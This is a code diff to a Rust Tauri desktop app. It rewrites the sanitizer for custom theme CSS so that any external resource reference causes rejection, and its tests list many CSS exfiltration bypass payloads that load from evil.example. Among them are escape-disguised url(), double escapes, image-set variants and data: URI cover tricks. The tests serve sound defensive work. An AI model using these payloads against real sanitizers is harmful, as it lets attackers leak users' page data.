@@ -4,7 +4,6 @@ use std::sync::Mutex;
 use tauri::{Emitter, Manager};
 use tauri_plugin_dialog::DialogExt;
 use tauri_plugin_fs::FsExt;
-use tauri_plugin_opener::OpenerExt;
 
 struct OpenedUrls(Mutex<Option<Vec<tauri::Url>>>);
 
@@ -259,9 +258,9 @@ fn open_locales_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !locales_dir.exists() {
         std::fs::create_dir_all(&locales_dir).map_err(|e| e.to_string())?;
     }
-    app.opener()
-        .open_path(locales_dir.to_string_lossy(), None::<&str>)
-        .map_err(|e| e.to_string())
+    // free function 收 AsRef<Path>，保留原始 path bytes；OpenerExt::open_path
+    // 的簽名是 Into<String>，非 UTF-8 路徑會被 lossy 轉換成開不到的路徑。
+    tauri_plugin_opener::open_path(&locales_dir, None::<&str>).map_err(|e| e.to_string())
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
@@ -273,22 +272,120 @@ pub struct CustomTheme {
     pub file_path: String,
 }
 
-// Strip external resource references from theme CSS to prevent CSS exfiltration
-// (attribute selectors + background-image can leak DOM data to attacker servers).
-// Only data: URIs are allowed; @import is stripped entirely.
+// 自訂主題 CSS 的外連防線：偵測到任何外部資源參照就整份拒絕（回傳空字串），
+// 乾淨的主題則原文原樣輸出。
 //
-// 三階段，順序不可換——前兩階段各自封掉一種曾實測繞過整個過濾器的偽裝：
-//   1. 移除註解：`/*x*/@import "https://…"` 曾讓 @import 行過濾失效
-//   2. 解碼 escape：`\75 rl("https://…")` 對 CSS 引擎等價於 url()，但躲得過字面比對
-//   3. 剝除外部 URL：對「URL 本身」下手而非函式名，故 image-set() 這類
-//      不經 url() 的載入函式一併涵蓋，不必逐一追黑名單
+// 為何是「偵測 + 拒絕」而非「就地清除」：清除要求本函式對 CSS 的理解與瀏覽器
+// tokenizer 完全一致，任何落差都是繞過。前一版就地改寫的實作被四種形式穿透
+// （註解前綴 @import、\75 rl()、\5c 75 二階 escape、單斜線 https:/host），
+// 且改寫本身會破壞合法 CSS（content: "\22" 被解成裸引號後打亂字串邊界）。
+// 改為偵測後，判斷失準只會偏向「誤判為可疑 → 拒絕載入」，方向是安全的。
 //
-// 注意這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
+// 這是 best-effort 的深度防禦，不是安全邊界：CSP 的 img-src 含萬用 `https:`
 // （Markdown 外部圖片所需），故此函式是自訂主題外連的唯一防線。
 fn sanitize_theme_css(css: &str) -> String {
-    let decommented = strip_css_comments(css);
-    let decoded = decode_css_escapes(&decommented);
-    strip_external_urls(&decoded)
+    if has_external_reference(css) {
+        String::new()
+    } else {
+        css.to_string()
+    }
+}
+
+// 已知會觸發外部請求的 scheme。判定在解碼後的分析視圖上做，故 escape 偽裝無效。
+const EXTERNAL_SCHEMES: [&str; 6] = ["http:", "https:", "ftp:", "ws:", "wss:", "file:"];
+
+fn has_external_reference(css: &str) -> bool {
+    let decoded = decode_css_escapes_to_fixpoint(&strip_css_comments(css)).to_ascii_lowercase();
+    let view = elide_data_uris(&decoded);
+
+    if view.contains("@import") {
+        return true;
+    }
+    // 涵蓋 protocol-relative（//host/path）
+    if view.contains("//") {
+        return true;
+    }
+    if EXTERNAL_SCHEMES.iter().any(|s| view.contains(s)) {
+        return true;
+    }
+    // url() 內容帶任何 scheme 即拒絕（涵蓋清單外的協定）。相對／同源絕對路徑
+    // 受 CSP default-src 'self' 侷限，不構成外連，予以放行。
+    let mut rest = view.as_str();
+    while let Some(pos) = rest.find("url(") {
+        let after = &rest[pos + 4..];
+        let Some(end) = after.find(')') else {
+            return true; // 未閉合的 url( — 無法判定，保守拒絕
+        };
+        let inner = after[..end].trim().trim_matches(|c: char| c == '"' || c == '\'');
+        if inner.contains(':') {
+            return true;
+        }
+        rest = &after[end..];
+    }
+    false
+}
+
+// data: URI 不會外連，但其內容常含 SVG 命名空間 http://www.w3.org/2000/svg 等字面，
+// 會誤觸上方的 scheme 偵測（內建 Office 97 主題就是這樣被誤殺的）。偵測前先剔除。
+//
+// data:image/svg+xml 內嵌的 <image href> / <use href> 已實測確認被瀏覽器阻擋
+// （SVG 作為 background-image 處於 secure static mode），故不需再對 MIME 分類。
+//
+// 邊界抓錯只會讓更多內容留在視圖裡 → 更容易判為可疑 → 偏保守，不是安全缺口。
+fn elide_data_uris(css: &str) -> String {
+    let mut out = String::with_capacity(css.len());
+    let mut chars = css.char_indices().peekable();
+
+    while let Some(&(i, c)) = chars.peek() {
+        // url(...)：以括號配對取內容，是 data: 就整段剔除
+        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
+            for _ in 0..4 {
+                chars.next();
+            }
+            let mut inner = String::new();
+            let mut depth = 1;
+            for (_, ch) in chars.by_ref() {
+                if ch == ')' {
+                    depth -= 1;
+                    if depth == 0 {
+                        break;
+                    }
+                }
+                if ch == '(' {
+                    depth += 1;
+                }
+                inner.push(ch);
+            }
+            let probe = inner.trim().trim_matches(|c: char| c == '"' || c == '\'');
+            out.push_str("url(");
+            if !probe.starts_with("data:") {
+                out.push_str(&inner);
+            }
+            out.push(')');
+            continue;
+        }
+        // 引號字串：以配對的同類引號為界（data: 內部的異類引號不會誤斷）
+        if c == '"' || c == '\'' {
+            let quote = c;
+            chars.next();
+            let mut inner = String::new();
+            for (_, ch) in chars.by_ref() {
+                if ch == quote {
+                    break;
+                }
+                inner.push(ch);
+            }
+            out.push(quote);
+            if !inner.trim_start().starts_with("data:") {
+                out.push_str(&inner);
+            }
+            out.push(quote);
+            continue;
+        }
+        chars.next();
+        out.push(c);
+    }
+    out
 }
 
 // 移除 /* */ 註解。字串內的 /* 不算註解，故需追蹤引號狀態。
@@ -333,9 +430,23 @@ fn strip_css_comments(css: &str) -> String {
     out
 }
 
-// 解碼 CSS escape：`\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
-// 正規化後 `\75 rl(` 還原為 `url(`，才輪得到下一階段的比對。
-fn decode_css_escapes(css: &str) -> String {
+// 反覆解碼直到不再變化：單次解碼擋不住二階 escape（`\5c 75 rl(` 解一次得
+// `\75 rl(`，瀏覽器自己會再解一次還原成 `url(`）。迭代上限防病態輸入。
+fn decode_css_escapes_to_fixpoint(css: &str) -> String {
+    let mut current = css.to_string();
+    for _ in 0..8 {
+        let next = decode_css_escapes_once(&current);
+        if next == current {
+            break;
+        }
+        current = next;
+    }
+    current
+}
+
+// `\` + 1-6 hex（可跟一個終止空白）→ 該 code point；`\` + 其他字元 → 該字元。
+// 只用於產生分析視圖，不影響輸出，故不必顧慮字串邊界是否被破壞。
+fn decode_css_escapes_once(css: &str) -> String {
     let mut out = String::with_capacity(css.len());
     let mut chars = css.chars().peekable();
 
@@ -369,81 +480,6 @@ fn decode_css_escapes(css: &str) -> String {
         }
     }
     out
-}
-
-// 外部 URL 判定：含 `//`（scheme 分隔或 protocol-relative）即視為外部。
-// data: URI 豁免——其 base64 內容本就可能含 `//`。
-fn is_external_url(value: &str) -> bool {
-    let trimmed = value.trim();
-    trimmed.contains("//") && !trimmed.starts_with("data:")
-}
-
-fn strip_external_urls(css: &str) -> String {
-    let mut result = String::with_capacity(css.len());
-    let mut chars = css.char_indices().peekable();
-
-    while let Some(&(i, c)) = chars.peek() {
-        // url(...)：維持原規則，只允許 data: 與空值（相對路徑一併清除）
-        if css.get(i..i + 4).is_some_and(|s| s.eq_ignore_ascii_case("url(")) {
-            result.push_str("url(");
-            for _ in 0..4 {
-                chars.next();
-            }
-            let mut inside = String::new();
-            let mut depth = 1;
-            for (_, ch) in chars.by_ref() {
-                if ch == ')' {
-                    depth -= 1;
-                    if depth == 0 {
-                        break;
-                    }
-                }
-                if ch == '(' {
-                    depth += 1;
-                }
-                inside.push(ch);
-            }
-            let trimmed = inside.trim().trim_matches(|c: char| c == '"' || c == '\'');
-            if trimmed.is_empty() || trimmed.starts_with("data:") {
-                result.push_str(&inside);
-            }
-            result.push(')');
-            continue;
-        }
-        // 引號字串：僅清空含外部 URL 者。image-set("https://…") 這類走這條，
-        // 而 font-family: "JetBrains Mono" 不受影響。
-        if c == '"' || c == '\'' {
-            let quote = c;
-            chars.next();
-            let mut inner = String::new();
-            for (_, ch) in chars.by_ref() {
-                if ch == quote {
-                    break;
-                }
-                inner.push(ch);
-            }
-            result.push(quote);
-            if !is_external_url(&inner) {
-                result.push_str(&inner);
-            }
-            result.push(quote);
-            continue;
-        }
-        chars.next();
-        result.push(c);
-    }
-
-    // @import 整行剝除（註解已於階段 1 移除，此處 trim_start 即足夠）
-    result
-        .lines()
-        .filter(|line| {
-            !line
-                .trim_start()
-                .get(..7)
-                .is_some_and(|s| s.eq_ignore_ascii_case("@import"))
-        })
-        .collect::<Vec<_>>()
-        .join("\n")
 }
 
 fn parse_theme_name(content: &str, default_id: &str) -> String {
@@ -668,9 +704,7 @@ fn open_themes_dir(app: tauri::AppHandle) -> Result<(), String> {
     if !themes_dir.exists() {
         std::fs::create_dir_all(&themes_dir).map_err(|e| e.to_string())?;
     }
-    app.opener()
-        .open_path(themes_dir.to_string_lossy(), None::<&str>)
-        .map_err(|e| e.to_string())
+    tauri_plugin_opener::open_path(&themes_dir, None::<&str>).map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -838,24 +872,40 @@ pub fn run() {
 mod tests {
     use super::*;
 
-    // 以下四個 payload 皆為實測繞過舊版 sanitizer、並在真實瀏覽器引擎確認會發出
-    // 外連請求的形式（2026-07-26 取證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
+    // 每一條都是實測確認過會發出真實外連請求的形式（2026-07-26 取證，
+    // 瀏覽器引擎 + 本地 server 收證）。CSP 的 img-src 含萬用 `https:`，擋不住這些。
     #[test]
-    fn blocks_proven_exfiltration_bypasses() {
+    fn rejects_proven_exfiltration_payloads() {
         let payloads = [
+            // 直接形式
+            r#"@import "https://evil.example/x.css";"#,
+            r#"body { background: url("https://evil.example/leak.png"); }"#,
+            r#"body { background: url(//evil.example/leak.png); }"#,
             // 註解前綴讓 @import 躲過行首比對
             r#"/*x*/@import "https://evil.example/x.css";"#,
             r#"/*a*/ @import "https://evil.example/x.css";"#,
-            // escape sequence 對 CSS 引擎等價於 url()
+            // escape 偽裝 url()
             r#"body { background: \75 rl("https://evil.example/leak.png"); }"#,
-            // image-set 系列根本不含 "url(" 字面
+            // 二階 escape：解一次得 \75 rl(，瀏覽器自己會再解一次
+            r#"body { background: \5c 75 rl(https://evil.example/leak.png); }"#,
+            r#"@\69mport "https:\2f\2fevil.example/hack.css";"#,
+            // image-set 系列不含 "url(" 字面
             r#"body { background-image: image-set("https://evil.example/is.png" 1x); }"#,
             r#"body { background-image: -webkit-image-set("https://evil.example/w.png" 1x); }"#,
-            // 直接形式（舊版已擋，防回歸）
-            r#"@import "https://evil.example/x.css";"#,
-            r#"body { background: url("https://evil.example/leak.png"); }"#,
-            // protocol-relative
-            r#"body { background: url(//evil.example/leak.png); }"#,
+            r#"body { background-image: image-set("//evil.example/x.png" 1x); }"#,
+            // WHATWG special scheme：斜線數量寬鬆，1 個甚至 0 個都會解析成 host
+            r#"body{background-image:-webkit-image-set("https:/evil.example/w.png" 1x)}"#,
+            r#"body{background-image:image-set("https:evil.example/w.png" 1x)}"#,
+            // 引號脫序：\22 解成裸引號後，舊實作的字串邊界全亂
+            r#"body { content: "\22"; background-image: image-set("https://evil.example/y.png"); }"#,
+            // 未閉合引號，連 escape 技巧都不需要
+            "a{content:\"oops}\nb{background:url(\"https://evil.example/x.png\")}",
+            // data: 掩護後夾帶
+            r#"body { background: url("data:image/png;base64,AA"), url("https://evil.example/x.png"); }"#,
+            r#"body { background-image: image-set("data:image/png;base64,AA" 1x, "https://evil.example/x.png" 2x); }"#,
+            // 其他載入函式
+            r#"@font-face { font-family: x; src: url("https://evil.example/f.woff2"); }"#,
+            r#"body { background-image: cross-fade(url("https://evil.example/a.png"), url(b.png)); }"#,
         ];
         for payload in payloads {
             let out = sanitize_theme_css(payload);
@@ -866,43 +916,47 @@ mod tests {
         }
     }
 
+    // 新實作不改寫乾淨的 CSS——這正是舊版就地改寫做不到的（它會把
+    // content: "a\22 b" 毀成 content: "a"b"）。斷言原文全等，不是「包含某片段」。
     #[test]
-    fn preserves_legitimate_theme_css() {
-        let css = r#"html[data-theme="x"] {
-  --bg: #0d1b1e;
-  --font-ui: "JetBrains Mono", ui-monospace, monospace;
-}
-html[data-theme="x"] body {
-  background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78, 204, 163, 0.35), transparent 60%), var(--bg);
-}"#;
-        let out = sanitize_theme_css(css);
-        assert!(out.contains("--bg: #0d1b1e;"), "CSS 變數被破壞: {out}");
-        assert!(out.contains(r#""JetBrains Mono""#), "字型名被誤清: {out}");
-        assert!(out.contains("radial-gradient"), "漸層被破壞: {out}");
-        assert!(out.contains("rgba(78, 204, 163, 0.35)"), "色值被破壞: {out}");
+    fn passes_legitimate_css_through_untouched() {
+        let cases = [
+            r#"html[data-theme="x"] { --bg: #0d1b1e; --fg: #e0ece4; }"#,
+            r#"html { --font-ui: "JetBrains Mono", ui-monospace, monospace; }"#,
+            "body { background: radial-gradient(1.5px 1.5px at 70% 8%, rgba(78,204,163,0.35), transparent 60%), var(--bg); }",
+            r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#,
+            // 合法 escape：舊版會破壞語法，新版原樣保留
+            r#"body { content: "a\22 b"; }"#,
+            "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }",
+            // 相對路徑不構成外連（CSP default-src 'self' 侷限）
+            r#"body { background: url("bg.png"); }"#,
+        ];
+        for css in cases {
+            assert_eq!(sanitize_theme_css(css), css, "合法 CSS 被改動或拒絕");
+        }
     }
 
+    // inline SVG data: URI 內含 xmlns='http://www.w3.org/2000/svg'，是 SVG 規範
+    // 強制要求的字面，不是外連。內建 Office 97 主題就是這個形式——若誤判，
+    // 整個主題會變空白。
     #[test]
-    fn preserves_data_uri() {
-        let css = r#"body { background: url("data:image/svg+xml;base64,PHN2Zy8+"); }"#;
-        let out = sanitize_theme_css(css);
-        assert!(out.contains("PHN2Zy8+"), "data: URI 應保留: {out}");
+    fn does_not_reject_inline_svg_namespace() {
+        let css = "body { background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16'%3E%3C/svg%3E\"); }";
+        assert_eq!(sanitize_theme_css(css), css);
     }
 
-    // 內建模板是使用者「複製為範本」的起點，淨化後不得變質。
+    // 內建模板是使用者「複製為範本」的起點，必須原樣通過。
     #[test]
-    fn builtin_templates_survive_sanitizer() {
+    fn builtin_templates_pass_through_unchanged() {
         for (name, template) in [
             ("emerald", TEMPLATE_EMERALD_FOREST),
             ("nordic", TEMPLATE_NORDIC_FROST),
             ("office97", TEMPLATE_OFFICE_97),
         ] {
-            let out = sanitize_theme_css(template);
-            // 註解移除與 escape 解碼會改變空白/字面，故比對關鍵宣告而非全等
-            assert!(out.contains("--bg:"), "{name} 的 --bg 遺失: {out}");
-            assert!(
-                out.matches('{').count() == template.matches('{').count(),
-                "{name} 的 rule 數量改變"
+            assert_eq!(
+                sanitize_theme_css(template),
+                template,
+                "{name} 被 sanitizer 改動或拒絕"
             );
         }
     }
@@ -912,5 +966,12 @@ html[data-theme="x"] body {
         // parse_theme_name 讀原始檔（非淨化後），此測試確認兩者職責未混淆
         let raw = "/* Theme Name: 翠綠森林 */\nhtml { --bg: #000; }";
         assert_eq!(parse_theme_name(raw, "fallback"), "翠綠森林");
+    }
+
+    #[test]
+    fn escape_decoding_reaches_fixpoint() {
+        // \5c 5c 75 → 連續解碼後仍應收斂，不可無限迴圈或提早放棄
+        let nested = r#"body { background: \5c 5c 75 rl(https://evil.example/x.png); }"#;
+        assert!(!sanitize_theme_css(nested).contains("evil.example"));
     }
 }
